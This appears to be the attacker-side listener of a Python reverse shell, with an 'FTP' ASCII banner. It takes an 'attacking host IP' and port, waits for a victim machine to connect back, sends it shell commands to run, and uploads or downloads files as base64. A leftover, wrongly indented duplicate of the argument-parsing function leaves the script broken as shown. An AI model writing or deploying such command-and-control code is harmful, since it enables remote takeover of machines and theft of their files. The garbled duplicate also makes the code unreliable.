#!/usr/bin/python3
import optparse
import base64
import socket
import json
import os



print(r"""FFFFFFFFFFFFFFFFFFFFFFTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP   
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::::::::::::P  
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::PPPPPP:::::P 
FF::::::FFFFFFFFF::::FT:::::TT:::::::TT:::::TPP:::::P     P:::::P
  F:::::F       FFFFFFTTTTTT  T:::::T  TTTTTT  P::::P     P:::::P
  F:::::F                     T:::::T          P::::P     P:::::P
  F::::::FFFFFFFFFF           T:::::T          P::::PPPPPP:::::P 
  F:::::::::::::::F           T:::::T          P:::::::::::::PP  
  F:::::::::::::::F           T:::::T          P::::PPPPPPPPP    
  F::::::FFFFFFFFFF           T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
FF:::::::FF                 TT:::::::TT      PP::::::PP          
F::::::::FF                 T:::::::::T      P::::::::P          
F::::::::FF                 T:::::::::T      P::::::::P          
FFFFFFFFFFF                 TTTTTTTTTTT      PPPPPPPPPP""") 
print()
print()
print()





import requests
import socket

public_ip = requests.get("https://api.ipify.org").text
print(f"[+] Public IP: {public_ip}")

local_ip = socket.gethostbyname(socket.gethostname())
print(f"[+] Local IP: {local_ip}")

def get_arguments():
"""Get user supplied arguments from terminal."""
parser = optparse.OptionParser()






def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-l', '--local', dest='local_ip', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', type="int", help='Port to connect to.')
    (options, arguments) = parser.parse_args()
    return options

options = get_arguments()

if not options.local_ip or not options.port:
    print("[-] Please provide -l <IP> and -p <PORT>")
    exit()

class Listener:
    def __init__(self, local_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections...')
        self.connection, address = listener.accept()
        print(f'[+] Connection from {str(address)}.')

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(4096)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send({"cmd": command})

        if command == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, contents):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contents))
        return '[+] Download successful...'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input('>> ')

            if command.startswith('upload '):
                file_path = command.split(' ')[1]
                file_content = self.read_file(file_path)
                command = f"upload {file_path} {file_content}"

            result = self.execute_remotely(command)

            if command.startswith('download ') and result.get("status") == "ok":
                path = command.split(' ')[1]
                self.write_file(path, result.get("data"))
                print("[+] Download complete")
            else:
                print(result.get("output"))

my_listener = Listener(options.local_ip, options.port)
my_listener.run()